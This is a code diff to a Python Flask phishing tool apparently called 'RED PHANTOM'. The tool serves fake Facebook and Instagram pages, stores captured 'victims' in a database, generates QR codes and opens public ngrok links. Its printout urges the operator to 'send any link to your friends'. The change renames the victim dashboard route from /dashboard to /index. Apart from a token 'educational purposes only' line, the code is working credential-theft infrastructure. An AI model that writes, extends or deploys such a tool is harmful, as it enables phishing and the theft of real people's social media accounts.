@@ -197,8 +197,8 @@ def instagram():
     security_message = random.choice(app.config['SECURITY_MESSAGES'])
     return render_template('instagram.html', security_message=security_message)
 
-@app.route('/dashboard')
-def dashboard():
+@app.route('/index')
+def index():
     conn = get_db_connection()
     c = conn.cursor()
     c.execute('SELECT * FROM victims ORDER BY id DESC')
@@ -220,7 +220,7 @@ def dashboard():
             'referer': row[9]
         })
     
-    return render_template('dashboard.html', victims=victims_list)
+    return render_template('index.html', victims=victims_list)
     
 @app.route('/qr')
 def qr_page():
@@ -228,7 +228,7 @@ def qr_page():
     links = {
         'facebook': f'{base}/facebook',
         'instagram': f'{base}/instagram',
-        'dashboard': f'{base}/dashboard'
+        'index': f'{base}/index'
     }
     
     qr_generator = QRGenerator()
@@ -252,7 +252,7 @@ def start_ngrok():
         print("✅ RED PHANTOM ACTIVE — HTTPS via ngrok!")
         print(f"🔗 Facebook:   {public_url}/facebook")
         print(f"🔗 Instagram:  {public_url}/instagram")
-        print(f"📊 Dashboard:  {public_url}/dashboard")
+        print(f"📊 index:  {public_url}/index")
         print(f"📲 QR Codes:   {public_url}/qr")
         print("="*70)
         print("🎯 Send any link to your friends — works globally (no same network)!")
@@ -341,7 +341,7 @@ if __name__ == '__main__':
         print("⚠️  Could not start ngrok thread")
     
     print("🌐 Local server: http://127.0.0.1:4000")
-    print("📱 Access the dashboard at: http://127.0.0.1:4000/dashboard")
+    print("📱 Access the index at: http://127.0.0.1:4000/index")
     print("🔒 Remember: This is for educational purposes only!")
     
     try:
